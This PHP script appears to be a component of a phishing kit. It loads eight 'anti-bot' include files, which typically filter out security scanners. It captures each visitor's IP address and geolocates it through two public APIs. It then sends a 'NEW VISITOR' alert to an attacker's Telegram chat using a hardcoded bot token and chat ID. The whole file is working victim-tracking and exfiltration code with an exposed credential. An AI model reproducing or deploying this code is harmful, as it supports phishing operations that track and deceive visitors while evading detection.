<?php  



include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';



    function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$msg = "
----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
NEW VISITOR SE :  IP : $ip | 
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "5496044174:AAGGvTlvxr5vNz9h2W_PnGUSL1NNFIKvTdg";
$data = [
    'text' => $msg,
    'chat_id' => '5876774871'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>
